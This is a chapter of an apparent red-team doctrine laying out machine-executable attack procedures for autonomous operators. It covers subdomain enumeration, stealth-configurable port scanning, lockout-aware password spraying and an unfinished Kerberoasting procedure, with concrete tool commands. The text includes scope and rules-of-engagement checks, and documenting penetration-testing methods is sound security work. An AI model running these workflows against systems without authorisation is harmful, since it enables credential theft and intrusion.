# 12 — Procedures: Step-by-Step Execution

---

## Classification: TAXONOMY LAYER 12 — STEP-BY-STEP EXECUTION WORKFLOWS

## Distribution: Autonomous Operators, Orchestration Engines, Authorized Human Principals

## Position in Taxonomy: HORIZONTAL OPERATIONAL CHAIN — Terminal node. Below Techniques (11). The most granular operational layer.

## Dependency: Receives from `11 - Techniques` and `10 - Tactics` → References `Doctrine` → Constrained by `07 - Principles` → Terminal — produces execution, evidence, and outcomes.

---

## Preamble

This is the ground floor.

Every layer above this one has dealt in abstraction at some level of remove from the target. Sovereignty established the right. Moral order established the justification. Legitimacy established the legal framework. Command authority established the relationship. Hierarchy established the structure. Ethos established the character. Principles established the decision rules. Doctrine codified the operational law. Strategy designed the campaign. Operational art orchestrated the phases. Tactics selected the approaches. Techniques specified the methods.

Procedures execute them.

A procedure is a step-by-step workflow — an ordered sequence of actions that implements a technique. It is the most granular unit of operation in this taxonomy. If the technique says "password spray against OWA using breach-derived credentials," the procedure says: verify the endpoint is reachable, enumerate valid mailboxes via timing differential, cross-reference discovered accounts against breach data, build the candidate list, configure the spray tool with the account lockout threshold minus one, execute in timed rounds, capture successes, log everything. Every step. Every decision point. Every error condition. Every cleanup action.

For a human operator, procedures are the part of the work they can explain to a junior team member: "Here is how you do this, step by step, in this order, with these tools." A skilled human carries dozens of procedures in their head — some written down, most not. They adapt on the fly. They skip steps they know are unnecessary for this specific target. They add steps when something unexpected happens. The procedure is a starting point; experience modifies it.

For the machine, the procedure is not a starting point. It is the execution plan. The machine does not carry procedures "in its head" and modify them by feel. The machine executes the procedure as defined, following every step, checking every precondition, handling every error, and generating every artifact. It does not skip steps because it "knows" they are unnecessary. It evaluates the skip condition and decides programmatically. It does not add steps by instinct. It follows the decision tree to the appropriate branch.

This is not rigidity. It is reliability. The machine executes with perfect fidelity because the procedure is designed for perfect execution. Every step is there for a reason. Every decision point has evaluated criteria. Every error handler has a defined response. The procedure is not a rough guide that the machine interprets. It is an operational program that the machine runs.

```
THE NATURE OF PROCEDURES:

  TECHNIQUE:  "Password spray against OWA endpoint"
  
  PROCEDURE:
    Step 1:   Verify endpoint is reachable and returns OWA login page
    Step 2:   Enumerate valid mailboxes via authentication timing analysis
    Step 3:   Cross-reference enumerated accounts against breach data
    Step 4:   Build credential candidate list
    Step 5:   Query or determine account lockout policy
    Step 6:   Configure spray parameters (1 password per round,
              wait period = lockout observation window + buffer)
    Step 7:   Execute spray round 1
    Step 8:   Analyze results — successes, failures, lockout indicators
    Step 9:   If successes: validate credentials, log, continue
    Step 10:  If no lockouts detected: execute next round
    Step 11:  If lockout detected: halt, analyze, adjust parameters
    Step 12:  Repeat rounds until list exhausted or objective met
    Step 13:  Compile results — valid credentials, attempted accounts, timing
    Step 14:  Clean up — remove tool artifacts, verify no residual processes

  Every step has:
    — A defined action
    — An expected result
    — An error condition and handler
    — A log entry generated

  The machine executes this. Exactly this. Every time.
  No shortcuts. No skipped steps. No "I already know this works."
  The procedure is the execution. The execution is the procedure.
```

---

## I — What Procedures Are

### 1.1 — Definition

A procedure is an ordered, step-by-step execution workflow that implements a specific technique. It is the terminal layer of the operational hierarchy — the point where abstract method becomes concrete action.

```
PROCEDURE CHARACTERISTICS:

  DETERMINISTIC:     Given the same inputs and environmental conditions,
                     the procedure produces the same execution sequence.
                     Randomness enters only through explicit randomization
                     steps (e.g., jitter, random user-agent rotation).

  COMPLETE:          Every step is specified. There is no implicit knowledge
                     required. A procedure can be executed by any operator —
                     human or machine — that has the prerequisite access,
                     tools, and information.

  SELF-CONTAINED:    A procedure specifies its own prerequisites, inputs,
                     steps, decision points, error handlers, outputs,
                     artifacts, and cleanup requirements. Nothing is assumed.

  LOGGED:            Every step generates a log entry. Every input is recorded.
                     Every output is captured. Every decision point records
                     which branch was taken and why. The execution log is
                     the complete audit trail.

  REVERSIBLE:        Where possible, procedures include rollback instructions
                     for every destructive or state-changing step. Where
                     rollback is impossible, the procedure documents this
                     explicitly.
```

### 1.2 — Procedures vs. Everything Above Them

```
TECHNIQUE says:    "Kerberoast service accounts to obtain crackable TGS tickets."

PROCEDURE says:    "1. Authenticate to the domain with the provided user
                       credentials via kinit or Rubeus.
                    2. Query LDAP for accounts with servicePrincipalName set,
                       filtering for user accounts (not machine accounts).
                    3. For each discovered SPN, request a TGS ticket using
                       RC4 encryption (downgrade if supported, else AES).
                    4. Export tickets to hashcat-compatible format.
                    5. Log all requested SPNs, ticket types, and encryption
                       levels.
                    6. Transfer hash file for offline cracking.
                    7. Clean up: purge ticket cache, remove temporary files."

TACTIC says:       "Use credential harvesting for privilege escalation."

PROCEDURE says:    [Same as above — the procedure is the tactic's technique's
                    concrete implementation.]

STRATEGY says:     "Achieve domain administrator access."

PROCEDURE says:    [I don't talk to strategy. I talk to the technique that
                    was selected by the tactic that was chosen by operational
                    art that was orchestrated under the strategy. I am seven
                    layers down. I execute.]
```

The procedure does not interpret strategy. It does not choose tactics. It does not select techniques. It executes the technique that was selected by the layers above. Its job is mechanical fidelity — perfect execution of a defined workflow.

### 1.3 — The Machine's Relationship to Procedures

For a human operator, procedures are knowledge. The human knows how to do the thing. The knowledge lives in the operator's training, muscle memory, and experience. The procedure document — if one exists — is a reference the human consults when they encounter something unfamiliar.

For the machine, procedures are executable programs. The machine does not "know" the procedure in a cognitive sense. It loads the procedure, validates prerequisites, and executes the steps. The procedure is not background knowledge; it is the foreground execution plan.

```
HUMAN PROCEDURE EXECUTION:

  1. Operator decides to Kerberoast
  2. Operator recalls the general steps from training
  3. Operator opens terminal
  4. Operator types commands from memory, adapting as needed
  5. Operator handles errors based on experience
  6. Operator may or may not log every step
  7. Operator moves on
  
  Quality: Varies with experience, fatigue, and discipline
  Logging: Varies with operator habits
  Error handling: Improvised
  Reproducibility: Approximate

MACHINE PROCEDURE EXECUTION:

  1. Decision engine selects Kerberoasting technique
  2. Procedure PROC-EXPLOIT-004 is loaded
  3. Prerequisites are validated programmatically
  4. Each step executes in order
  5. Decision points are evaluated against defined criteria
  6. Errors trigger defined handlers
  7. Every step is logged with full input/output
  8. Cleanup executes
  
  Quality: Consistent — identical every time
  Logging: Complete — structural, not optional
  Error handling: Defined — branching, not improvised
  Reproducibility: Exact
```

---

## II — Procedure Architecture

### 2.1 — The Standard Procedure Template

Every procedure in the library follows a standard template. This is not a formatting preference — it is a structural requirement. The template ensures that every procedure carries the complete information needed for execution, validation, and auditing.

```
PROCEDURE:
  id:             [Unique identifier — e.g., PROC-EXPLOIT-004]
  name:           [Descriptive name — e.g., Kerberoasting]
  version:        [Semver — e.g., 2.1.0]
  last_validated: [Date of last successful lab validation]
  
  implements:     [Technique ID(s) this procedure serves]
  classification: [reconnaissance | enumeration | exploitation |
                   post-exploitation | persistence | evasion |
                   collection | cleanup]
  
  prerequisites:
    access:       [Required access level — e.g., domain user,
                   local admin, network access]
    tools:        [Required tools with minimum versions]
    information:  [Required inputs — IPs, credentials, hostnames,
                   domain name, etc.]
    environment:  [Environmental conditions — e.g., "target runs
                   Active Directory," "OWA endpoint is externally
                   accessible"]
  
  input:
    — [parameter_name]: [type] — [description] — [required|optional]
    — [parameter_name]: [type] — [description] — [required|optional]
    ...
  
  steps:
    1. [Action]
       expected:  [What should happen]
       on_error:  [What to do if it doesn't]
       log:       [What to record]
    2. [Action]
       expected:  [What should happen]
       on_error:  [What to do if it doesn't]
       log:       [What to record]
    ...
  
  decision_points:
    — at_step: [N]
      condition: [If X]
      true_branch: [Go to step Y]
      false_branch: [Go to step Z]
    ...
  
  output:
    — [result_name]: [type] — [description]
    — [result_name]: [type] — [description]
    ...
  
  evidence:
    — [evidence_type]: [description] — [storage location]
    ...
  
  artifacts:
    — [artifact]: [location] — [cleanup_procedure_id]
    ...
  
  cleanup:
    1. [Action] — [Verification method]
    2. [Action] — [Verification method]
    ...
  
  estimated_duration: [Time range]
  risk_level:         [low | medium | high]
  noise_level:        [silent | quiet | moderate | loud]
  
  rollback:
    — [Step N]: [How to undo this step if needed]
    ...
  
  references:
    — [ATT&CK ID, tool documentation, relevant standards]
```

### 2.2 — Template Field Definitions

```
FIELD DEFINITIONS — WHY EACH FIELD EXISTS:

  id:
    Every procedure has a unique identifier. The identifier encodes
    the classification: PROC-REC for reconnaissance, PROC-ENUM for
    enumeration, PROC-EXPLOIT for exploitation, PROC-POST for
    post-exploitation, PROC-CLEAN for cleanup. The numeric suffix
    is sequential within category.
    
    The machine references procedures by ID. The ID is stable across
    versions. A procedure's ID never changes even when its content
    is updated.

  version:
    Procedures evolve as tools update, defenses change, and operational
    lessons accumulate. The version tracks this evolution. The machine
    always executes the latest validated version. Older versions are
    archived, not deleted — they may be needed if a current version
    fails and regression is suspected.

  last_validated:
    A procedure that has not been validated in a lab environment is
    not trusted for operational use. This date records the last
    successful end-to-end validation. Procedures that have not been
    validated within the framework's recency threshold are flagged
    for re-validation before use.

  implements:
    Links the procedure to the technique(s) it serves. A single
    technique may have multiple implementing procedures (different
    tools, different approaches). A procedure typically implements
    one technique but may serve multiple if the execution workflow
    is identical.

  classification:
    The operational phase this procedure belongs to. Used for
    procedure selection, library organization, and engagement
    phase tracking.

  prerequisites:
    What must be true before the procedure can execute. The machine
    validates every prerequisite before beginning step 1. If any
    prerequisite is not met, the procedure does not execute — it
    returns a prerequisite failure with details about what is missing.
    Prerequisites are evaluated, not assumed.

  input:
    The parameters the procedure requires. Typed and described.
    Required inputs must be provided before execution. Optional
    inputs have documented defaults.

  steps:
    The core execution sequence. Each step is an atomic action with
    an expected outcome and an error handler. Steps execute in order
    unless a decision point redirects flow.

  decision_points:
    Branch logic within the procedure. At defined steps, the procedure
    evaluates a condition and follows the appropriate branch. This is
    how procedures adapt to runtime conditions without abandoning
    their structure.

  output:
    What the procedure produces. Typed and described. Output becomes
    input for downstream procedures in a procedure chain.

  evidence:
    What forensic or reporting evidence the procedure generates.
    Evidence is distinct from output — output feeds the next procedure,
    evidence feeds the engagement report.

  artifacts:
    Files, accounts, configurations, or other objects created during
    execution that must be cleaned up. Each artifact links to a
    cleanup procedure or cleanup step.

  cleanup:
    Actions to remove, restore, or undo procedure artifacts. Every
    cleanup step includes a verification method — the machine does
    not trust that cleanup succeeded without confirmation.

  estimated_duration:
    Time range for procedure completion under normal conditions.
    Used for scheduling, parallel execution planning, and anomaly
    detection (a procedure running 10x its expected duration may
    be hung or encountering unexpected resistance).

  risk_level:
    The operational risk of executing this procedure. High-risk
    procedures require additional authorization checks before
    execution.

  noise_level:
    The detection footprint of the procedure. Governs whether the
    procedure is appropriate under the current stealth calibration.
    Silent procedures generate no network traffic (passive analysis).
    Loud procedures generate significant detectable activity (full
    port scans, brute-force attempts).

  rollback:
    For every state-changing step, the corresponding undo action.
    If a procedure must be aborted mid-execution, the rollback
    section defines how to reverse completed steps in reverse order.
```

### 2.3 — Procedure Identification Scheme

```
PROCEDURE ID FORMAT:

  PROC-[CATEGORY]-[NUMBER]

  Categories:
    REC       Reconnaissance
    ENUM      Enumeration
    EXPLOIT   Exploitation
    POST      Post-exploitation
    PERSIST   Persistence
    EVASION   Evasion
    COLLECT   Collection
    CLEAN     Cleanup

  Examples:
    PROC-REC-001      Passive DNS Enumeration
    PROC-ENUM-003     SMB Share Enumeration
    PROC-EXPLOIT-004  Kerberoasting
    PROC-POST-002     BloodHound Data Collection
    PROC-CLEAN-005    Full Engagement Cleanup Verification

  Version is tracked separately:
    PROC-EXPLOIT-004 v2.1.0
    (ID stays stable; version increments)
```

---

## III — Core Procedure Library

This section contains representative procedures at full depth. These are not the complete procedure library — the complete library is a living, continuously updated inventory. These procedures illustrate the standard, the depth, and the execution model that every procedure in the library follows.

---

### PROC-REC-001: Passive DNS Enumeration

```
PROCEDURE:
  id:             PROC-REC-001
  name:           Passive DNS Enumeration
  version:        1.3.0
  last_validated: Current

  implements:     TECH-REC-DNS-PASSIVE
  classification: reconnaissance

  prerequisites:
    access:       Internet access (no target network access required)
    tools:        — amass (v4.0+)
                  — subfinder (v2.6+)
                  — curl / httpie
                  — jq
    information:  — Target root domain(s)
                  — API keys for passive DNS services (optional,
                    increases coverage)
    environment:  — Outbound HTTPS connectivity
                  — DNS resolution functional

  input:
    — target_domain: string — Root domain to enumerate (e.g., target.com)
                     — required
    — api_keys: object — Keys for SecurityTrails, VirusTotal, Shodan,
                         Censys, PassiveTotal — optional
    — output_dir: path — Directory for results — required

  steps:
    1. CREATE output directory structure
       action:    mkdir -p ${output_dir}/{raw,merged,validated}
       expected:  Directory tree created
       on_error:  Log filesystem error, halt — cannot proceed without
                  output location
       log:       "Output directory initialized: ${output_dir}"

    2. EXECUTE subfinder passive enumeration
       action:    subfinder -d ${target_domain} -all -silent
                  -o ${output_dir}/raw/subfinder.txt
       expected:  Text file with one subdomain per line
       on_error:  Log tool failure, continue to next source — subfinder
                  is one of multiple sources
       log:       "subfinder completed: [N] subdomains discovered"

    3. EXECUTE amass passive enumeration
       action:    amass enum -passive -d ${target_domain}
                  -o ${output_dir}/raw/amass.txt
       expected:  Text file with one subdomain per line
       on_error:  If timeout: retry with reduced source list.
                  If crash: log, continue — amass is one of multiple
                  sources
       log:       "amass completed: [N] subdomains discovered"

    4. QUERY Certificate Transparency logs
       action:    curl -s "https://crt.sh/?q=%.${target_domain}&output=json"
                  | jq -r '.[].name_value' | sort -u
                  > ${output_dir}/raw/crt_sh.txt
       expected:  Text file with subdomains extracted from CT logs
       on_error:  If API unreachable: retry after 30s. If persistent
                  failure: log, continue
       log:       "crt.sh query completed: [N] entries"

    5. QUERY additional passive sources (if API keys provided)
       action:    For each configured API source:
                  — SecurityTrails API → ${output_dir}/raw/sectrails.txt
                  — VirusTotal API → ${output_dir}/raw/virustotal.txt
                  — Shodan API → ${output_dir}/raw/shodan.txt
       expected:  Additional subdomain files per source
       on_error:  Per-source: log API error, continue to next source
       log:       "API source [name] completed: [N] results"

    6. MERGE and deduplicate all sources
       action:    cat ${output_dir}/raw/*.txt | sort -u
                  > ${output_dir}/merged/all_subdomains.txt
       expected:  Single deduplicated file of all discovered subdomains
       on_error:  If merge fails: check for empty source files, retry
       log:       "Merged results: [N] unique subdomains from [M] sources"

    7. VALIDATE format — strip wildcards, remove invalid entries
       action:    grep -E '^[a-zA-Z0-9]([a-zA-Z0-9\-]*\.)+[a-zA-Z]{2,}$'
                  ${output_dir}/merged/all_subdomains.txt
                  > ${output_dir}/validated/subdomains.txt
       expected:  Clean list of syntactically valid subdomains
       on_error:  If regex produces empty output: review merged file
                  manually, adjust pattern
       log:       "Validated: [N] subdomains passed format check
                   ([M] removed as invalid)"

    8. GENERATE summary report
       action:    Produce JSON summary:
                  { domain, total_unique, per_source_counts,
                    timestamp, tool_versions }
       expected:  Summary file at ${output_dir}/validated/summary.json
       on_error:  Non-critical — log warning, procedure still succeeds
       log:       "Summary generated"

  decision_points:
    — at_step: 5
      condition: API keys provided in input
      true_branch: Execute API queries for each configured source
      false_branch: Skip to step 6 (merge)

  output:
    — subdomains: list[string] — Validated unique subdomains
    — summary: object — Per-source statistics and metadata

  evidence:
    — subdomain_list: Complete enumeration results — ${output_dir}/validated/
    — source_attribution: Per-source raw files for audit trail —
      ${output_dir}/raw/

  artifacts:
    — raw files: ${output_dir}/raw/ — Retain for engagement duration,
      delete at engagement cleanup (PROC-CLEAN-001)
    — merged files: ${output_dir}/merged/ — Retain for engagement duration

  cleanup:
    1. No target-side artifacts — this is passive reconnaissance
    2. Operator-side cleanup handled by engagement-level cleanup
       procedure (PROC-CLEAN-005)

  estimated_duration: 5–30 minutes (dependent on API response times
                      and domain size)
  risk_level:         low
  noise_level:        silent (no direct contact with target infrastructure)

  rollback:
    — No target-side state change. Rollback is deletion of local output
      files only.

  references:
    — MITRE ATT&CK: T1596 (Search Open Technical Databases)
    — subfinder documentation
    — amass documentation
```

---

### PROC-ENUM-001: Full TCP Port Scan

```
PROCEDURE:
  id:             PROC-ENUM-001
  name:           Full TCP Port Scan (65535 ports)
  version:        2.0.0
  last_validated: Current

  implements:     TECH-ENUM-PORTSCAN-FULL
  classification: enumeration

  prerequisites:
    access:       Network connectivity to target (direct or through pivot)
    tools:        — rustscan (v2.1+) OR masscan (v1.3+) — initial discovery
                  — nmap (v7.94+) — service verification
    information:  — Target IP address(es) or CIDR range
                  — Rules of engagement scan rate limits (if any)
    environment:  — Target is within authorized scope
                  — Network path exists to target

  input:
    — targets: string — IP address, comma-separated list, or CIDR range
               — required
    — rate_limit: integer — Maximum packets per second (default: 5000
                  for internal, 1000 for external) — optional
    — output_dir: path — Results directory — required
    — stealth_mode: boolean — If true, use SYN scan with reduced rate
                    and randomized order (default: false) — optional

  steps:
    1. VALIDATE targets are within authorized scope
       action:    Compare target IPs against scope document.
                  Every IP in the target set must fall within an
                  authorized range.
       expected:  All targets confirmed in scope
       on_error:  If ANY target is out of scope: HALT ENTIRE PROCEDURE.
                  Log scope violation. Do not scan.
       log:       "Scope validation: [N] targets confirmed in scope"

    2. DETERMINE scan parameters based on stealth_mode
       action:    If stealth_mode:
                    scan_type = "-sS" (SYN scan)
                    rate = min(rate_limit, 500)
                    timing = "-T2"
                    flags = "--randomize-hosts --data-length 24"
                  Else:
                    scan_type = "-sS" (SYN scan, default)
                    rate = rate_limit
                    timing = "-T4"
       expected:  Scan parameters configured
       on_error:  N/A — configuration step
       log:       "Scan parameters: type=${scan_type}, rate=${rate},
                   timing=${timing}, stealth=${stealth_mode}"

    3. EXECUTE fast port discovery with rustscan
       action:    rustscan -a ${targets} --range 1-65535
                  --batch-size ${rate} --timeout 3000
                  -- -oG ${output_dir}/rustscan_initial.gnmap
       expected:  List of open ports per target host
       on_error:  If rustscan unavailable: fall back to masscan.
                  If masscan unavailable: fall back to nmap (slower).
                  If network unreachable: check routing, check pivot,
                  retry once. If persistent: log failure, halt.
       log:       "Fast discovery complete: [N] open ports across
                   [M] hosts"

    4. PARSE discovered open ports
       action:    Extract unique host:port pairs from rustscan output.
                  Produce ${output_dir}/open_ports.txt with format:
                  IP,PORT per line
       expected:  Clean list of open ports for targeted nmap scan
       on_error:  If parsing fails: check rustscan output format,
                  adjust parser
       log:       "Parsed [N] unique open ports across [M] hosts"

    5. EXECUTE targeted nmap service scan on discovered ports
       action:    nmap -sV -sC ${scan_type} ${timing}
                  -p [comma-separated ports from step 4]
                  ${targets}
                  -oA ${output_dir}/nmap_services
       expected:  XML, grepable, and normal output with service versions,
                  script results, and OS hints
       on_error:  If nmap hangs on a host: skip host after timeout,
                  log, continue. If nmap crashes: retry once. If
                  persistent: log partial results, continue with
                  what was collected.
       log:       "Service scan complete: [N] services identified
                   across [M] hosts"

    6. PARSE nmap results into structured format
       action:    Parse nmap XML output into JSON:
                  { host: IP, ports: [
                    { port: N, state: open, service: name,
                      version: string, scripts: [...] }
                  ]}
       expected:  Structured JSON at ${output_dir}/services.json
       on_error:  If XML malformed: fall back to grepable output parsing
       log:       "Results parsed: [N] hosts, [M] services, [K] script
                   results"

    7. FLAG high-value services
       action:    Mark services matching high-value patterns:
                  — SMB (445), RDP (3389), WinRM (5985/5986)
                  — MSSQL (1433), MySQL (3306), PostgreSQL (5432)
                  — LDAP (389/636), Kerberos (88)
                  — Web (80/443/8080/8443)
                  — SSH (22)
                  — Management interfaces (custom ports with HTTP services)
       expected:  High-value services flagged in output JSON
       on_error:  Non-critical — flagging is advisory
       log:       "High-value services flagged: [N] across [M] hosts"

    8. GENERATE scan summary
       action:    Produce summary: total hosts scanned, total ports
                  scanned, open ports by host, services by type,
                  high-value targets, scan duration, scan parameters
       expected:  Summary at ${output_dir}/scan_summary.json
       on_error:  Non-critical
       log:       "Scan summary generated"

  decision_points:
    — at_step: 3
      condition: rustscan binary available
      true_branch: Use rustscan for fast discovery
      false_branch: Fall back to masscan, then nmap -p- if neither
                    fast scanner is available

    — at_step: 5
      condition: Number of open ports > 500 per host
      true_branch: Split nmap scan into batches of 200 ports to avoid
                   timeout. Execute batches sequentially.
      false_branch: Scan all discovered ports in single nmap invocation.

  output:
    — services: list[object] — Structured service inventory per host
    — open_ports: list[string] — Raw IP:port list
    — high_value_targets: list[object] — Flagged high-priority services

  evidence:
    — nmap_output: Full nmap output in all formats — ${output_dir}/
    — scan_parameters: Exact scan configuration used —
      logged in procedure execution log
    — service_inventory: Complete service map — ${output_dir}/services.json

  artifacts:
    — Output files: ${output_dir}/ — Retain for engagement,
      clean at engagement end (PROC-CLEAN-001)

  cleanup:
    1. No target-side artifacts generated by port scanning
    2. Operator-side files retained for engagement, cleaned at
       engagement close

  estimated_duration: 5–45 minutes (varies with target count,
                      network latency, and scan rate)
  risk_level:         medium (active scanning generates network traffic
                      detectable by IDS/IPS/NDR)
  noise_level:        moderate (loud if not in stealth mode;
                      quiet in stealth mode)

  rollback:
    — No target-side state change. Port scanning is non-destructive.
      Rollback is deletion of local output files.

  references:
    — MITRE ATT&CK: T1046 (Network Service Discovery)
    — nmap documentation (nmap.org)
    — rustscan documentation
```

---

### PROC-EXPLOIT-001: Password Spray Against Web Application

```
PROCEDURE:
  id:             PROC-EXPLOIT-001
  name:           Password Spray Against Web Application
  version:        2.2.0
  last_validated: Current

  implements:     TECH-IA-CREDSPRAY-WEB
  classification: exploitation

  prerequisites:
    access:       Network access to target web application login endpoint
    tools:        — spray tool: trevorspray (v2.0+), SprayingToolkit,
                    or custom HTTP client
                  — curl / httpie — for endpoint verification
                  — wfuzz or ffuf — for response analysis (optional)
    information:  — Target login URL
                  — List of valid or candidate usernames
                  — Account lockout policy (threshold and observation
                    window) — MUST be determined before spraying
                  — Password candidates (breach-derived or policy-based)
    environment:  — Login endpoint is reachable
                  — Credential-based attack is authorized in ROE
                  — Account lockout threshold is known or conservatively
                    estimated

  input:
    — target_url: string — Login endpoint URL — required
    — usernames: list[string] — Validated or candidate usernames — required
    — passwords: list[string] — Password candidates, ordered by likelihood
                 — required
    — lockout_threshold: integer — Account lockout threshold — required
    — lockout_window: integer — Lockout observation window in minutes
                      — required
    — request_delay: integer — Delay between individual requests in
                     milliseconds (default: 100) — optional
    — user_agent: string — User-agent string to use (default: rotate
                  from common browser UAs) — optional
    — output_dir: path — Results directory — required

  steps:
    1. VERIFY target endpoint is reachable and returns login form
       action:    Send GET request to ${target_url}.
                  Verify HTTP 200 response with login form elements.
       expected:  HTTP 200 with recognizable login page
       on_error:  If connection refused: check URL, check network path.
                  If non-200 response: log response code and body,
                  investigate (redirect? WAF block? maintenance page?).
                  If unreachable after 3 retries: halt procedure.
       log:       "Endpoint verified: ${target_url} returns login form
                   (HTTP ${status_code})"

    2. CHARACTERIZE authentication response behavior
       action:    Submit 2–3 known-invalid credentials to establish
                  baseline response:
                  — Measure response time for invalid username
                  — Measure response time for valid username +
                    invalid password (if a known-valid user exists)
                  — Record response body, headers, status code,
                    and set-cookie behavior for each case
       expected:  Baseline response profile for success/failure
                  differentiation
       on_error:  If all test submissions are blocked: WAF or rate
                  limiting detected. Reduce rate, change source IP
                  if authorized, or abort.
       log:       "Response characterization complete:
                   invalid_user: ${time}ms, ${status}, ${body_hash}
                   valid_user_bad_pass: ${time}ms, ${status}, ${body_hash}"

    3. CONFIGURE spray parameters
       action:    Set spray configuration:
                  — passwords_per_round: 1
                    (NEVER exceed lockout_threshold - 1 per window)
                  — round_delay: lockout_window + 5 minutes (buffer)
                  — request_delay: ${request_delay} between individual
                    requests
                  — total_rounds: len(passwords)
                  — total_requests_per_round: len(usernames)
                  — estimated_total_time: total_rounds × round_delay
       expected:  Configuration documented and validated
       on_error:  N/A — configuration step
       log:       "Spray configured: ${passwords_per_round} password(s)
                   per round, ${round_delay}min between rounds,
                   ${total_rounds} total rounds, estimated time:
                   ${estimated_total_time}"

    4. EXECUTE spray round
       action:    For each username in the list:
                  — Submit authentication request with current
                    round's password
                  — Record: username, password, response status,
                    response time, response body hash, timestamp
                  — Wait ${request_delay} between requests
                  — If response matches success baseline: flag as
                    VALID CREDENTIAL
                  — If response indicates lockout: HALT IMMEDIATELY
       expected:  Per-username result array for this round
       on_error:  If connection drops mid-round: wait 60s, retry
                  from last successful request.
                  If WAF blocks requests: halt, log, consider source
                  IP rotation if authorized.
                  If lockout response detected: HALT ALL SPRAYING.
                  Log lockout event. This is a critical error — do not
                  continue without human review.
       log:       "Round [N] complete: [successes] valid, [failures]
                   invalid, [errors] errors, [lockouts] lockout
                   indicators"

    5. EVALUATE round results
       action:    Analyze results from step 4:
                  — If valid credentials found: record, continue
                    spraying remaining users to maximize coverage
                    (unless ROE says stop on first success)
                  — If lockout indicators detected: HALT.
                  — If no lockouts and no successes: proceed to
                    next round after delay
       expected:  Decision on whether to continue, halt, or declare
                  success
       on_error:  N/A — evaluation step
       log:       "Round [N] evaluation: continue=${decision},
                   valid_creds=${count}, lockout_detected=${boolean}"

    6. WAIT between rounds
       action:    Sleep for ${round_delay} minutes.
                  During wait: no authentication requests to target.
       expected:  Delay completes, lockout window resets
       on_error:  N/A — sleep step
       log:       "Waiting ${round_delay} minutes before round [N+1]
                   (lockout window reset)"

    7. REPEAT rounds 4–6 for each password in the list
       action:    Loop through password list, executing one round
                  per password with full delay between rounds
       expected:  All passwords attempted against all users, or
                  procedure halted by success/lockout/completion
       on_error:  Per-round error handling applies (step 4)
       log:       "Spray loop: round [N] of [total]"

    8. VALIDATE captured credentials
       action:    For each credential flagged as valid:
                  — Re-authenticate to confirm validity
                  — Record successful authentication evidence
                    (response headers, session token, redirect URL)
                  — If MFA prompt: record MFA status, do not attempt
                    bypass unless separately authorized
       expected:  Confirmed valid credential list with authentication
                  evidence
       on_error:  If previously valid credential fails re-validation:
                  possible password change or session invalidation.
                  Log discrepancy.
       log:       "Credential validation: [N] of [M] confirmed valid,
                   [K] MFA-protected"

    9. COMPILE results
       action:    Generate results file:
                  — Valid credentials (username, password, validation
                    timestamp, MFA status)
                  — All attempted combinations with results
                  — Spray timing and rate statistics
                  — Lockout events (if any)
       expected:  Results at ${output_dir}/spray_results.json
       on_error:  Non-critical
       log:       "Results compiled: ${output_dir}/spray_results.json"

    10. CLEAN UP
        action:   — Verify no residual spray tool processes running
                  — Remove any temporary files created by spray tool
                  — Verify no persistent sessions left open on target
        expected:  Clean state — no leftover processes or files
        on_error:  If processes persist: kill explicitly. If files
                   remain: delete and verify.
        log:       "Cleanup complete: no residual artifacts"

  decision_points:
    — at_step: 4 (during execution)
      condition: Lockout response detected for ANY account
      true_branch: HALT ALL SPRAYING IMMEDIATELY. Log lockout.
                   Do not resume without human principal review.
      false_branch: Continue round execution.

    — at_step: 5
      condition: Valid credentials found AND ROE specifies
                 "stop on first success"
      true_branch: Skip remaining rounds. Proceed to step 8
                   (validation).
      false_branch: Continue to next round to maximize coverage.

    — at_step: 8
      condition: MFA prompt detected on valid credential
      true_branch: Record MFA status. Do not attempt bypass unless
                   MFA bypass is explicitly authorized in ROE.
                   Flag for operator review.
      false_branch: Proceed with full credential validation.

  output:
    — valid_credentials: list[object] — Confirmed username/password
      pairs with MFA status
    — spray_statistics: object — Total attempted, success rate,
      timing data
    — lockout_events: list[object] — Any lockout indicators observed

  evidence:
    — spray_log: Complete request/response log — ${output_dir}/
    — valid_credential_proof: Authentication success evidence per
      credential — ${output_dir}/
    — spray_configuration: Exact parameters used —
      procedure execution log

  artifacts:
    — Spray tool logs: ${output_dir}/ — Retain for engagement,
      clean at end (PROC-CLEAN-001)
    — Active sessions: If any sessions created during validation,
      log out explicitly in cleanup

  cleanup:
    1. Kill any running spray tool processes — verify with process list
    2. Remove temporary files — verify with directory listing
    3. Log out of any active sessions created during validation
    4. Verify no persistent cookies or tokens cached locally

  estimated_duration: 30 minutes to 24+ hours (dependent on username
                      list size, password list size, and lockout window)
  risk_level:         high (account lockout risk; detection risk)
  noise_level:        moderate to loud (many authentication attempts
                      generate logs visible to SOC)

  rollback:
    — No target-side state change beyond authentication log entries
      (which cannot be rolled back).
    — If accounts are locked: this is a significant operational impact.
      Report immediately to engagement lead and client contact per
      doctrine escalation procedures.

  references:
    — MITRE ATT&CK: T1110.003 (Brute Force: Password Spraying)
    — Relevant tool documentation for selected spray tool
```

---

### PROC-EXPLOIT-004: Kerberoasting

```
PROCEDURE:
  id:             PROC-EXPLOIT-004
  name:           Kerberoasting — Service Ticket Extraction for Offline Cracking
  version:        2.1.0
  last_validated: Current

  implements:     TECH-ESC-KERBEROAST
  classification: exploitation

  prerequisites:
    access:       — Valid domain user credentials (any privilege level)
                  — Network access to a domain controller (TCP 88,
                    TCP 389/636)
    tools:        — impacket (GetUserSPNs.py, v0.11+) OR
                  — Rubeus (v2.0+, if executing from a Windows host) OR
                  — pypykatz (alternative)
                  — hashcat (v6.2+) or john (v1.9+) — for offline cracking
    information:  — Domain name (FQDN and NetBIOS)
                  — Domain controller IP or hostname
                  — Valid domain credentials (username and password or
                    NTLM hash)
    environment:  — Active Directory environment
                  — Domain controller reachable on Kerberos port (88)
                  — At least one service account with SPN set exists
                    (expected, not guaranteed)

  input:
    — domain: string — Domain FQDN (e.g., corp.target.com) — required
    — dc_ip: string — Domain controller IP — required
    — username: string — Domain username — required
    — password: string — Domain password (or NTLM hash with -hashes flag)
                — required
    — output_dir: path — Results directory — required
    — wordlist: path — Password wordlist for offline cracking — optional
                (default: standard engagement wordlist)

  steps:
    1. VERIFY domain controller connectivity
       action:    Test connectivity to DC on TCP 88 (Kerberos) and
                  TCP 389 (LDAP).
       expected:  Both ports reachable and responding
       on_error:  If port 88 unreachable: check network path, check
                  firewall rules, verify DC IP. If port 389 unreachable:
                  Kerberoasting can proceed without LDAP if SPNs are
                  known, but SPN enumeration requires LDAP. Log and
                  evaluate.
       log:       "DC connectivity verified: ${dc_ip} — Kerberos: OK,
                   LDAP: OK"

    2. VERIFY credentials are valid
       action:    Attempt LDAP bind or Kerberos TGT request with
